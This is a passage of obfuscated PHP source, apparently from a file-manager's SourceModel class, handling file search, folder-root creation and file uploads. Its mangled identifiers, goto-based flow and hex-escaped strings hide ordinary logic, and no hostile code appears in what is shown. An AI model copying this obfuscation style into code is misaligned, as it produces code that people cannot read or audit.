= KodIO::fileTypeList(); $DÑ†Ö‰Ñ„ = $e¡«Ä©Éëµ[$aÖë¾îË¤]; goto b¬‡ˆ—´²; E†ğè­…¹: if (!$DÑ†Ö‰Ñ„[$EÃğ–…ÊĞñ[160]]) { $f‚Ø¬ªİ‰Ñ = array_to_keyvalue($e¡«Ä©Éëµ, $EÃğ–…ÊĞñ[33], $EÃğ–…ÊĞñ[160]); $a¢ò©‚ƒÆ = implode($EÃğ–…ÊĞñ[47], $f‚Ø¬ªİ‰Ñ); $d›°œñ“‘ = $EÃğ–…ÊĞñ[2272]; } $d×ôÃæ¢­ = explode($EÃğ–…ÊĞñ[47], trim($a¢ò©‚ƒÆ, $EÃğ–…ÊĞñ[47])); return array($d›°œñ“‘, $d×ôÃæ¢­); goto Eª¾¬±»Ñó; b¬‡ˆ—´²: if (!$DÑ†Ö‰Ñ„) { return array(); } $a¢ò©‚ƒÆ = $DÑ†Ö‰Ñ„[$EÃğ–…ÊĞñ[160]]; $d›°œñ“‘ = $EÃğ–…ÊĞñ[7]; goto E†ğè­…¹; Eª¾¬±»Ñó: } public function listPathType($aæœù‰¹Œ‘) { $Dë…ßÍîÌ§ =& $_SERVER[¯Ò¬Èè]; $BšÑ¦Ì‡Ë = $this->fileTypeWhere($aæœù‰¹Œ‘); if (!$BšÑ¦Ì‡Ë) { return array(); } $d‡ˆ›Ú¤´ = array($Dë…ßÍîÌ§[530] => SourceModel::TYPE_USER, $Dë…ßÍîÌ§[531] => USER_ID, $Dë…ßÍîÌ§[527] => 0, $Dë…ßÍîÌ§[528] => $BšÑ¦Ì‡Ë); return $this->listSource($d‡ˆ›Ú¤´); } public function listSearch($b©ñ§ÜÎÜ, $aÉÈ‰àÈ‡ê = 300) { goto aŞ¶Å£¥‡; FÓÉ‚¶‚ò: $this->_listSearchBindPinyin($b©ñ§ÜÎÜ, $EƒŞ±Œ•², $eÏÍ«ï¾ó); $this->alias($dà¼½½œ›[487])->_makeOrder()->cache(null, 10); $Dè°èšÃÏë = $this->distinct(!0)->field($eÏÍ«ï¾ó)->where($EƒŞ±Œ•²)->selectPage($aÉÈ‰àÈ‡ê); goto bÃÏ‡ğ÷Õ´; c´¦ƒºÂ: if (!isset($EƒŞ±Œ•²[$dà¼½½œ›[397]])) { $EƒŞ±Œ•²[$dà¼½½œ›[397]] = 0; } $eÏÍ«ï¾ó = $dà¼½½œ›[2323]; $e¦ô˜¼Ò—– = $eÏÍ«ï¾ó; goto FÓÉ‚¶‚ò; bÃÏ‡ğ÷Õ´: $this->_listSearchDesc($Dè°èšÃÏë, $b©ñ§ÜÎÜ, $e¦ô˜¼Ò—–); $this->_listSearchTag($Dè°èšÃÏë, $b©ñ§ÜÎÜ, $e¦ô˜¼Ò—–); $this->_listDataApply($Dè°èšÃÏë[$dà¼½½œ›[354]]); goto d„·ğÔÀß”; d„·ğÔÀß”: $this->_listMake($Dè°èšÃÏë); return $Dè°èšÃÏë; goto CÈÍ”‹ë¯; aŞ¶Å£¥‡: $dà¼½½œ› =& $_SERVER[¯Ò¬Èè]; if (isset($b©ñ§ÜÎÜ[$dà¼½½œ›[2190]]) && $b©ñ§ÜÎÜ[$dà¼½½œ›[2190]]) { $b©ñ§ÜÎÜ[$dà¼½½œ›[2190]] = str_replace($dà¼½½œ›[1602], $dà¼½½œ›[2322], trim($b©ñ§ÜÎÜ[$dà¼½½œ›[2190]])); } $EƒŞ±Œ•² = $this->_parseSearchWhere($b©ñ§ÜÎÜ); goto c´¦ƒºÂ; CÈÍ”‹ë¯: } private function _listSearchTag(&$CŠîÊâÙÑø, $e¸ñ£¥¡™, $BÖ³Û…¤®¶) { goto bÒ½›ÖİÄ ; AÇ«¡£âÇÁ: if (!$E·øÛ‹³Ÿß) { return; } $d»§ß•œ•¡ = array($BŞÁò…éÒ›[393] => array($BŞÁò…éÒ›[7], $E·øÛ‹³Ÿß)); $A¤Á¸³ëƒ… = Model($BŞÁò…éÒ›[394])->field($BŞÁò…éÒ›[75])->where($d»§ß•œ•¡)->select(); goto bè†ù‚Ô­; bè†ù‚Ô­: $A¤Á¸³ëƒ… = array_to_keyvalue($A¤Á¸³ëƒ…, $BŞÁò…éÒ›[33], $BŞÁò…éÒ›[75]); $f­ŠµØÛøó = array_unique($A¤Á¸³ëƒ…); $this->_listSearchMerge($CŠîÊâÙÑø, $e¸ñ£¥¡™, $BÖ³Û…¤®¶, $f­ŠµØÛøó); goto Cõ¡Ó½™à«; A†Şí¯Ø»ƒ: $E·øÛ‹³Ÿß = array(); $Cã¥Û‡õ„† = $e¸ñ£¥¡™[$BŞÁò…éÒ›[2190]]; foreach ($FÕ½ÜİÃƒñ as $eºˆ¸‹˜©Ô) { $aÑŸĞØ˜¢Ô = $eºˆ¸‹˜©Ô[$BŞÁò…éÒ›[28]]; $d á… = str_replace($BŞÁò…éÒ›[50], $BŞÁò…éÒ›[33], Pinyin::encode($aÑŸĞØ˜¢Ô)); if (stripos($aÑŸĞØ˜¢Ô, $Cã¥Û‡õ„†) !== !1 || stripos($d á…, $Cã¥Û‡õ„†) !== !1) { $E·øÛ‹³Ÿß[] = $eºˆ¸‹˜©Ô[$BŞÁò…éÒ›[367]]; } } goto AÇ«¡£âÇÁ; bÒ½›ÖİÄ : $BŞÁò…éÒ› =& $_SERVER[¯Ò¬Èè]; if (!$e¸ñ£¥¡™[$BŞÁò…éÒ›[2190]] || $CŠîÊâÙÑø[$BŞÁò…éÒ›[351]][$BŞÁò…éÒ›[340]] > 1) { return; } $FÕ½ÜİÃƒñ = Model($BŞÁò…éÒ›[2324])->listData(); goto A†Şí¯Ø»ƒ; Cõ¡Ó½™à«: } private function _listSearchDesc(&$dãÕ®×Ğ, $eí•ÁÇ¼‚˜, $F‚¯ä¡»Ÿ) { goto A™àİ…‹; DèïãÔÁ¦¡: $d‡ñ¤ì“Ÿ¢ = array_unique($d‡ñ¤ì“Ÿ¢); if (!$d‡ñ¤ì“Ÿ¢) { return; } $e¯Ç¯…¬ø = array($F°®ÕãÚñÓ[369] => array($F°®ÕãÚñÓ[7], $d‡ñ¤ì“Ÿ¢), $F°®ÕãÚñÓ[89] => $F°®ÕãÚñÓ[405], $F°®ÕãÚñÓ[359] => array($F°®ÕãÚñÓ[766], $F°®ÕãÚñÓ[2192] . $eí•ÁÇ¼‚˜[$F°®ÕãÚñÓ[2190]] . $F°®ÕãÚñÓ[2192])); goto AèŒª«£±»; AèŒª«£±»: $a±„©ôå©¬ = Model($F°®ÕãÚñÓ[513])->field($F°®ÕãÚñÓ[369])->where($e¯Ç¯…¬ø)->select(); $d„¹æÀíÚ¸ = array_to_keyvalue($a±„©ôå©¬, $F°®ÕãÚñÓ[33], $F°®ÕãÚñÓ[369]); $this->_listSearchMerge($dãÕ®×Ğ, $eí•ÁÇ¼‚˜, $F‚¯ä¡»Ÿ, $d„¹æÀíÚ¸); goto b“¢¤Š•ö¸; A™àİ…‹: $F°®ÕãÚñÓ =& $_SERVER[¯Ò¬Èè]; if (!$eí•ÁÇ¼‚˜[$F°®ÕãÚñÓ[2190]] || $dãÕ®×Ğ[$F°®ÕãÚñÓ[351]][$F°®ÕãÚñÓ[340]] > 1) { return; } $d‡ñ¤ì“Ÿ¢ = $this->listSearchChildren($eí•ÁÇ¼‚˜[$F°®ÕãÚñÓ[461]]); goto DèïãÔÁ¦¡; b“¢¤Š•ö¸: } private function _listSearchMerge(&$b¹´¼¼ã½·, $eóÉÛÅŒ, $dóµ½»Œ‰œ, $Bİ½ˆæïøø) { goto aæÓ’òÀÛò; A¼ÃÍ¡»‚—: $d„Ü´Ú¢É¨ = $this->field($dóµ½»Œ‰œ)->where($f¤“é¼¼ìç)->select(); if (!$d„Ü´Ú¢É¨) { return; } $f­¶åÊøÛ = array(); goto e‡‡â¡Áª­; aæÓ’òÀÛò: $C¤“ä“œ =& $_SERVER[¯Ò¬Èè]; if (!$Bİ½ˆæïøø) { return; } $cí¨æ½ƒ£Ü = array_to_keyvalue($b¹´¼¼ã½·[$C¤“ä“œ[354]], $C¤“ä“œ[33], $C¤“ä“œ[369]); goto f÷¦©†¬´â; e‡‡â¡Áª­: foreach ($d„Ü´Ú¢É¨ as $d®˜Ã­Í¥ƒ) { $c’©§±ÀáÛ = $C¤“ä“œ[47] . $eóÉÛÅŒ[$C¤“ä“œ[461]] . $C¤“ä“œ[47]; if (stripos($d®˜Ã­Í¥ƒ[$C¤“ä“œ[459]], $c’©§±ÀáÛ) !== !1) { $f­¶åÊøÛ[] = $d®˜Ã­Í¥ƒ; } } $b¹´¼¼ã½·[$C¤“ä“œ[354]] = array_merge($f­¶åÊøÛ, $b¹´¼¼ã½·[$C¤“ä“œ[354]]); $b¹´¼¼ã½·[$C¤“ä“œ[351]][$C¤“ä“œ[352]] += count($f­¶åÊøÛ); goto dÄ®çí£Š’; f÷¦©†¬´â: $C²ïä¸ù×§ = array_diff($Bİ½ˆæïøø, $cí¨æ½ƒ£Ü); if (!$C²ïä¸ù×§) { return; } $f¤“é¼¼ìç = array($C¤“ä“œ[369] => array($C¤“ä“œ[7], $C²ïä¸ù×§)); goto A¼ÃÍ¡»‚—; dÄ®çí£Š’: } public function listSearchChildren($b¡¼Ççİè, $A©¸…µÌî = 5000) { goto D¯ÔÖ¾¹‹Á; c«†“¿ªçª: $dÄ„ÍŠØ× = array($Fšä”É¶¬[459] => array($Fšä”É¶¬[766], $CªÉˆŒëñ[$Fšä”É¶¬[459]] . $CªÉˆŒëñ[$Fšä”É¶¬[369]] . $Fšä”É¶¬[484])); $fª¯Îİ¤Å• = $this->field($Fšä”É¶¬[369])->cache(null, 600)->where($dÄ„ÍŠØ×)->count(); if ($fª¯Îİ¤Å• > $A©¸…µÌî) { return $this->_listSearchChildrenNear($b¡¼Ççİè, $A©¸…µÌî); } goto D†ãÓÑˆŸï; D¯ÔÖ¾¹‹Á: $Fšä”É¶¬ =& $_SERVER[¯Ò¬Èè]; $B½ÆÍÉ’³ = array(); $CªÉˆŒëñ = $this->sourceInfo($b¡¼Ççİè); goto c«†“¿ªçª; D†ãÓÑˆŸï: $b¨•›–Ì­ = $this->field($Fšä”É¶¬[369])->where($dÄ„ÍŠØ×)->select(); $B½ÆÍÉ’³ = array_to_keyvalue($b¨•›–Ì­, $Fšä”É¶¬[33], $Fšä”É¶¬[369]); return $B½ÆÍÉ’³; goto f¨Ë¹õĞ¼Ö; f¨Ë¹õĞ¼Ö: } private function _listSearchChildrenNear($e¿ãœ ’¾Ñ, $a…¿ŒÜÒæ—) { goto dŸÁ†¸Æ; dŸÁ†¸Æ: $Fá²Æ²ÕÖ =& $_SERVER[¯Ò¬Èè]; $fŞŸ­ì‰¤Ñ = array(); $DÒˆÖœª“’ = array($Fá²Æ²ÕÖ[461] => $e¿ãœ ’¾Ñ); goto A¨ŞÇ±‰¤; F¿ÆÈ®·¨„: if (!$B•Œ‘ä») { return $fŞŸ­ì‰¤Ñ; } $DÒˆÖœª“’ = array($Fá²Æ²ÕÖ[461] => array($Fá²Æ²ÕÖ[7], $B•Œ‘ä»)); $Fêß»çƒõó = $this->field($Fá²Æ²ÕÖ[2325])->where($DÒˆÖœª“’)->select(); goto bºÚóëø¿²; A¨ŞÇ±‰¤: $Fêß»çƒõó = $this->field($Fá²Æ²ÕÖ[2325])->where($DÒˆÖœª“’)->select(); $B•Œ‘ä» = array_to_keyvalue(array_filter_by_field($Fêß»çƒõó, $Fá²Æ²ÕÖ[370], $Fá²Æ²ÕÖ[83]), $Fá²Æ²ÕÖ[33], $Fá²Æ²ÕÖ[369]); $fŞŸ­ì‰¤Ñ = array_merge($fŞŸ­ì‰¤Ñ, array_to_keyvalue($Fêß»çƒõó, $Fá²Æ²ÕÖ[33], $Fá²Æ²ÕÖ[369])); goto F¿ÆÈ®·¨„; bºÚóëø¿²: $fŞŸ­ì‰¤Ñ = array_merge($fŞŸ­ì‰¤Ñ, array_to_keyvalue($Fêß»çƒõó, $Fá²Æ²ÕÖ[33], $Fá²Æ²ÕÖ[369])); $fŞŸ­ì‰¤Ñ = array_slice($fŞŸ­ì‰¤Ñ, 0, $a…¿ŒÜÒæ—); return $fŞŸ­ì‰¤Ñ; goto FêØõÁÙ¯¯; FêØõÁÙ¯¯: } private function _listSearchBindPinyin($FÀ©à®İ¢Ì, &$B¡Ö‡›³Ä, &$AæŒš˜ÊõŠ) { goto B½¥æ’”¦Í; Cà÷Ä÷ö„Ô: unset($B¡Ö‡›³Ä[$BÉÜáó¯Æ†[28]]); foreach ($B¡Ö‡›³Ä as $CÛ»­ÅŸì˜ => $C‚ùÉ¬Éª) { $E©ìê¡†¸ò[$BÉÜáó¯Æ†[2327] . $CÛ»­ÅŸì˜] = $C‚ùÉ¬Éª; } $Cˆ×åœ†Ø = array($BÉÜáó¯Æ†[483], $BÉÜáó¯Æ†[2192] . $FÀ©à®İ¢Ì[$BÉÜáó¯Æ†[2190]] . $BÉÜáó¯Æ†[2192]); goto eåµÂ‚ñˆ; B½¥æ’”¦Í: $BÉÜáó¯Æ† =& $_SERVER[¯Ò¬Èè]; if (!Input::check($FÀ©à®İ¢Ì[$BÉÜáó¯Æ†[2190]], $BÉÜáó¯Æ†[306]) || strlen($FÀ©à®İ¢Ì[$BÉÜáó¯Æ†[2190]]) < 2) { return; } $cáí»°‰ÜÀ = "\114\x45\x46\x54\40\112\117\x49\116\x20{$this->tablePrefix}\151\157\137\x73\157\165\162\x63\x65\x5f\x6d\x65\164\141\40\155\145\164\x61\x20\x6f\156\x20\163\157\165\x72\143\145\56\163\x6f\x75\x72\x63\145\111\104\x20\75\40\x6d\145\x74\x61\56\163\x6f\165\x72\x63\x65\111\x44"; goto cŒŠª„–°˜; eåµÂ‚ñˆ: $E©ìê¡†¸ò[] = array($BÉÜáó¯Æ†[2329] => $Cˆ×åœ†Ø, $BÉÜáó¯Æ†[923] => $BÉÜáó¯Æ†[2194], array($BÉÜáó¯Æ†[2330] => $Cˆ×åœ†Ø, $BÉÜáó¯Æ†[2331] => array($BÉÜáó¯Æ†[7], array($BÉÜáó¯Æ†[416], $BÉÜáó¯Æ†[415])))); $this->join($cáí»°‰ÜÀ); $B¡Ö‡›³Ä = $E©ìê¡†¸ò; goto D‘±ğ™Ü; cŒŠª„–°˜: $E©ìê¡†¸ò = array(); $AæŒš˜ÊõŠ = str_replace(array($BÉÜáó¯Æ†[217], $BÉÜáó¯Æ†[50], $BÉÜáó¯Æ†[2326]), $BÉÜáó¯Æ†[33], $AæŒš˜ÊõŠ); $AæŒš˜ÊõŠ = $BÉÜáó¯Æ†[2327] . str_replace($BÉÜáó¯Æ†[47], $BÉÜáó¯Æ†[2328], $AæŒš˜ÊõŠ); goto Cà÷Ä÷ö„Ô; D‘±ğ™Ü: } private function _parseSearchWhere($bæ×âï¸é˜) { goto Cİï®†ˆëÉ; CªñÊÅë¸°: if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[544]])) { $AÍ†µÖòÍ°[] = array($b›÷ØŒ„ºÔ[379] => $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[544]], $b›÷ØŒ„ºÔ[378] => $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[544]], $b›÷ØŒ„ºÔ[923] => $b›÷ØŒ„ºÔ[2194]); } if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[372]])) { $a¾–‡·ïİ¨ = $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[372]]; if ($a¾–‡·ïİ¨ == $b›÷ØŒ„ºÔ[76]) { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[370]] = 1; } else { if ($a¾–‡·ïİ¨ == $b›÷ØŒ„ºÔ[2337]) { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[370]] = 0; } else { if ($a¾–‡·ïİ¨) { $a¾–‡·ïİ¨ = is_array($a¾–‡·ïİ¨) ? $a¾–‡·ïİ¨ : explode($b›÷ØŒ„ºÔ[47], $a¾–‡·ïİ¨); $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[372]] = array($b›÷ØŒ„ºÔ[384], $a¾–‡·ïİ¨); $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[370]] = 0; } } } } if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[461]])) { $d¢ÉÜªó¶° = $this->sourceInfo($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[461]]); $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[534]] = array($b›÷ØŒ„ºÔ[483], $d¢ÉÜªó¶°[$b›÷ØŒ„ºÔ[459]] . $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[461]] . $b›÷ØŒ„ºÔ[484]); } goto EêÚ–ÀÔ¢¬; Cİï®†ˆëÉ: $b›÷ØŒ„ºÔ =& $_SERVER[¯Ò¬Èè]; $AÍ†µÖòÍ° = array(); if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[716]])) { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[107]] = array($b›÷ØŒ„ºÔ[2332], $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[716]]); } goto CˆÕ·š”µó; CˆÕ·š”µó: if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[717]])) { $EîÁãÇšŒë = array($b›÷ØŒ„ºÔ[2333], $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[717]]); if ($AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[107]]) { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[107]] = array($AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[107]], $EîÁãÇšŒë, $b›÷ØŒ„ºÔ[2334]); } else { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[107]] = $EîÁãÇšŒë; } } if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[2335]])) { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[77]] = array($b›÷ØŒ„ºÔ[2332], $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[2335]]); } if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[2336]])) { $EîÁãÇšŒë = array($b›÷ØŒ„ºÔ[2333], $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[2336]]); if ($AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[77]]) { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[77]] = array($AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[77]], $EîÁãÇšŒë, $b›÷ØŒ„ºÔ[2334]); } else { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[77]] = $EîÁãÇšŒë; } } goto CªñÊÅë¸°; EêÚ–ÀÔ¢¬: if (isset($bæ×âï¸é˜[$b›÷ØŒ„ºÔ[2190]]) && $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[2190]]) { $AÉÌ˜ê¡ù = $bæ×âï¸é˜[$b›÷ØŒ„ºÔ[2190]]; $a¥Ü²óä = explode($b›÷ØŒ„ºÔ[50], $AÉÌ˜ê¡ù); if (strlen($AÉÌ˜ê¡ù) > 2 && (substr($AÉÌ˜ê¡ù, 0, 1) == $b›÷ØŒ„ºÔ[113] && substr($AÉÌ˜ê¡ù, -1) == $b›÷ØŒ„ºÔ[113]) || substr($AÉÌ˜ê¡ù, 0, 1) == $b›÷ØŒ„ºÔ[55] && substr($AÉÌ˜ê¡ù, -1) == $b›÷ØŒ„ºÔ[55]) { $AÉÌ˜ê¡ù = substr($AÉÌ˜ê¡ù, 1, -1); $a¥Ü²óä = array($AÉÌ˜ê¡ù); } $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[28]] = array($b›÷ØŒ„ºÔ[483], $b›÷ØŒ„ºÔ[2192] . $AÉÌ˜ê¡ù . $b›÷ØŒ„ºÔ[2192]); if (count($a¥Ü²óä) > 1) { $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[28]] = array(); foreach ($a¥Ü²óä as $b°‘²¯š¶) { if (!trim($b°‘²¯š¶)) { continue; } $AÍ†µÖòÍ°[$b›÷ØŒ„ºÔ[28]][] = array($b›÷ØŒ„ºÔ[483], $b›÷ØŒ„ºÔ[2192] . trim($b°‘²¯š¶) . $b›÷ØŒ„ºÔ[2192]); } } } return $AÍ†µÖòÍ°; goto d¯³÷½•½â; d¯³÷½•½â: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($aºôùŒò“î) { $cµ£ÂÂŸÏ =& $_SERVER[¯Ò¬Èè]; $dÅÏØõ“¢× = Model($cµ£ÂÂŸÏ[474])->where(array($cµ£ÂÂŸÏ[1437] => $aºôùŒò“î))->find(); $e°„ÏÕ’Ø = $this->_mkdirRoot(SourceModel::TYPE_USER, $aºôùŒò“î, $dÅÏØõ“¢×[$cµ£ÂÂŸÏ[28]]); $this->userDesktopAdd($e°„ÏÕ’Ø); return $e°„ÏÕ’Ø; } public function userDesktopAdd($DÙª²´©Ÿ) { $fÖÊƒØò =& $_SERVER[¯Ò¬Èè]; $e¨àöÁóº° = LNG($fÖÊƒØò[2338]); $d°İ™ƒ‰Èİ = $this->mkdir($DÙª²´©Ÿ, $e¨àöÁóº°); $this->metaSet($d°İ™ƒ‰Èİ, $fÖÊƒØò[2339], $fÖÊƒØò[83]); $this->metaSet($DÙª²´©Ÿ, $fÖÊƒØò[2340], $d°İ™ƒ‰Èİ); } public function groupRootAdd($eé¬ùò¢) { $eŠÍ«¤ò„ğ =& $_SERVER[¯Ò¬Èè]; $Eó±·İ¿Ş¤ = Model($eŠÍ«¤ò„ğ[458])->where(array($eŠÍ«¤ò„ğ[2186] => $eé¬ùò¢))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $eé¬ùò¢, $Eó±·İ¿Ş¤[$eŠÍ«¤ò„ğ[28]]); } public function systemRootPathAdd($AŠÏäìéé) { if ($AŠÏäìéé != $_SERVER[¯Ò¬Èè][1098]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $AŠÏäìéé); } public function userRootRemove($AÓåËÑÄˆÍ) { $bÚ†ˆÌ·ƒ = $this->sourceRoot(SourceModel::TYPE_USER, $AÓåËÑÄˆÍ); if (!$bÚ†ˆÌ·ƒ) { return; } $this->remove($bÚ†ˆÌ·ƒ, !1); } public function groupRootRemove($cŠÓØ•¹ã’) { $CˆÊ­ñœ£ = $this->sourceRoot(SourceModel::TYPE_GROUP, $cŠÓØ•¹ã’); if (!$CˆÊ­ñœ£) { return; } $this->remove($CˆÊ­ñœ£, !1); } private function _mkdirRoot($a·Úæ•—°ä, $A©°³œ¸à¯, $aÔŒŒœŞÀÖ) { goto cšŸÔáÚŞ«; bÕ³……Çø: CacheLock::unlock($Eï¾ÏÀ„¹í); return $dï‰›„¿ Ò; goto c•ÀÚÏ¥§; A»â‰Ø›ùâ: $dï‰›„¿ Ò = $this->add($CÄ§š®Ú’Š); $B¸È¬„Ö÷é = array($cöÆÃê«òà[536] => short_id($dï‰›„¿ Ò)); $this->where(array($cöÆÃê«òà[383] => $dï‰›„¿ Ò))->save($B¸È¬„Ö÷é); goto bÕ³……Çø; cšŸÔáÚŞ«: $cöÆÃê«òà =& $_SERVER[¯Ò¬Èè]; $CÄ§š®Ú’Š = array($cöÆÃê«òà[368] => 0, $cöÆÃê«òà[530] => $a·Úæ•—°ä, $cöÆÃê«òà[531] => $A©°³œ¸à¯, $cöÆÃê«òà[527] => 1, $cöÆÃê«òà[532] => USER_ID, $cöÆÃê«òà[533] => USER_ID, $cöÆÃê«òà[528] => $cöÆÃê«òà[33], $cöÆÃê«òà[534] => $cöÆÃê«òà[470], $cöÆÃê«òà[396] => 0, $cöÆÃê«òà[529] => 0, $cöÆÃê«òà[420] => 0, $cöÆÃê«òà[535] => $cöÆÃê«òà[33]); if ($a›Ëî³®¼ = $this->where($CÄ§š®Ú’Š)->find()) { return $a›Ëî³®¼[$cöÆÃê«òà[369]]; } goto d©ë­áîä…; d©ë­áîä…: $Eï¾ÏÀ„¹í = "\115\157\144\145\x6c\123\x6f\165\x72\x63\145\x2e\x6d\x6b\x64\x69\162\x52\157\x6f\164\56{$a·Úæ•—°ä}\x2e{$A©°³œ¸à¯}\56" . $aÔŒŒœŞÀÖ; CacheLock::lock($Eï¾ÏÀ„¹í); $CÄ§š®Ú’Š[$cöÆÃê«òà[28]] = $aÔŒŒœŞÀÖ; goto A»â‰Ø›ùâ; c•ÀÚÏ¥§: } private function sourceRoot($FŠ°›ò´², $d†òØ«Šİ…, $BßÂÀíŸÂ = false) { $f¡ƒºöÖ½¹ =& $_SERVER[¯Ò¬Èè]; $dÓ’¶µœÇã = array($f¡ƒºöÖ½¹[368] => 0, $f¡ƒºöÖ½¹[530] => $FŠ°›ò´², $f¡ƒºöÖ½¹[531] => $d†òØ«Šİ…); if ($D¡¥¿±¿¯ = $this->where($dÓ’¶µœÇã)->find()) { return $BßÂÀíŸÂ ? $D¡¥¿±¿¯ : $D¡¥¿±¿¯[$f¡ƒºöÖ½¹[369]]; } return !1; } public function sourceRootGroup($AÕîå‹Ô–) { $aŞâªÂÔÅÇ =& $_SERVER[¯Ò¬Èè]; if (is_string($AÕîå‹Ô–)) { $AÕîå‹Ô– = array($AÕîå‹Ô–); } $F–ó“óĞÓ× = array($aŞâªÂÔÅÇ[368] => 0, $aŞâªÂÔÅÇ[530] => SourceModel::TYPE_GROUP, $aŞâªÂÔÅÇ[531] => array($aŞâªÂÔÅÇ[7], $AÕîå‹Ô–)); $D²óİ¿‚÷ˆ = $this->listSource($F–ó“óĞÓ×, 1000); return array_to_keyvalue($D²óİ¿‚÷ˆ[$aŞâªÂÔÅÇ[74]], $aŞâªÂÔÅÇ[456]); } public function mkfile($b¬ÅÄ« ×©, $c±ÌäÆ²Ä, $Eœ¸ñŞËù = '', $cÁ¶İÁÆ¦ë = REPEAT_RENAME) { $F…¥¨‰¤„ =& $_SERVER[¯Ò¬Èè]; $bë¢¢èë¯Ù = Model($F…¥¨‰¤„[553])->addFileByContent($Eœ¸ñŞËù, $c±ÌäÆ²Ä); return $this->_createFileCall($b¬ÅÄ« ×©, $c±ÌäÆ²Ä, $bë¢¢èë¯Ù, $cÁ¶İÁÆ¦ë, $F…¥¨‰¤„[1134]); } public function addFile($B¾‚‡ãĞ, $dê›¸œ²Ş…, $Fº„«ÇÖ‘, $e“è‹æÚºä = false, $AÉÕ¾Éîœ¾ = REPEAT_RENAME) { $E¼á‡§ôÏ… = Model($_SERVER[¯Ò¬Èè][553])->addFile($dê›¸œ²Ş…, $Fº„«ÇÖ‘, $e“è‹æÚºä); return $this->_createFileCall($B¾‚‡ãĞ, $Fº„«ÇÖ‘, $E¼á‡§ôÏ…, $AÉÕ¾Éîœ¾); } public function addFileByFileID($eåƒÒåĞÈµ, $dŞÑååóïù, $eïŒŞ¤²ÏÒ, $Cª‚Àµ¥” = REPEAT_RENAME) { $FÂ„ˆ¿‚†‘ =& $_SERVER[¯Ò¬Èè]; $f‘íëš¾…® = Model($FÂ„ˆ¿‚†‘[553])->find($dŞÑååóïù); Model($FÂ„ˆ¿‚†‘[553])->linkAdd($dŞÑååóïù); return $this->_createFileCall($eåƒÒåĞÈµ, $eïŒŞ¤²ÏÒ, $f‘íëš¾…®, $Cª‚Àµ¥”); } public function addFileByRemote($DÌàŠÑŞù, $dÆ‡ÍÇ™ò¾, $BñêÖ ëç, $Dä¾°§‚¾Ä = array(), $AØÇÑÛ‡½ = REPEAT_RENAME) { $f¦¼´ë‰™ = Model($_SERVER[¯Ò¬Èè][553])->addFileByRemote($dÆ‡ÍÇ™ò¾, $BñêÖ ëç, $Dä¾°§‚¾Ä); return $this->_createFileCall($DÌàŠÑŞù, $BñêÖ ëç, $f¦¼´ë‰™, $AØÇÑÛ‡½); } private function _createFileCall($c„ÀÃî“Äé, $aÔÒ±’ĞÂ–, $fÎÚ‡­½ÕÅ, $e‡‚ ¯µ¯, $BÒæ¸¸Ö‹ = "\x75\x70\x6c\157\141\x64") { goto E‘å§”Ï¯Ò; E‘å§”Ï¯Ò: $c…ëÎƒ–Üƒ =& $_SERVER[¯Ò¬Èè]; $EÈŞ‹ƒÚŞø = !1; $this->lockWriteStart($c„ÀÃî“Äé, $aÔÒ±’ĞÂ–); goto AÒ‚®ŞÉéÂ; AÒ‚®ŞÉéÂ: $eÊÎÔÍ—ÁÃ = $this->_createFile($c„ÀÃî“Äé, $aÔÒ±’ĞÂ–, $fÎÚ‡­½ÕÅ, $e‡‚ ¯µ¯, $EÈŞ‹ƒÚŞø); if (!$EÈŞ‹ƒÚŞø) { Model($c…ëÎƒ–Üƒ[422])->remove($fÎÚ‡­½ÕÅ[$c…ëÎƒ–Üƒ[419]]); } else { if ($eÊÎÔÍ—ÁÃ) { Model($c…ëÎƒ–Üƒ[2311])->eventCreate($eÊÎÔÍ—ÁÃ, $BÒæ¸¸Ö‹); } } $this->lockWriteEnd($c„ÀÃî“Äé, $aÔÒ±’ĞÂ–); goto FöŒ™¨ÉÅ©; FöŒ™¨ÉÅ©: return $eÊÎÔÍ—ÁÃ; goto bíÖ‰Èò¢¢; bíÖ‰Èò¢¢: } public function mkdir($D…¢Œà¨», $bï—¢Ùôè, $e¢õ¥±õä = REPEAT_SKIP) { goto C·¬•ÊùÎ÷; Böã±‰‡¾: $BÂÇ×³ÀŒÂ = $this->_addSoure($B­ÀŠè½£Ì, $A‰Ñˆ¿¾Î˜); Model($A†ŞÑÃÑÁĞ[2311])->eventCreate($BÂÇ×³ÀŒÂ, $A†ŞÑÃÑÁĞ[1135]); $this->lockWriteEnd($D…¢Œà¨», $bï—¢Ùôè); goto c—ÆÅ¶°Æå; C·¬•ÊùÎ÷: 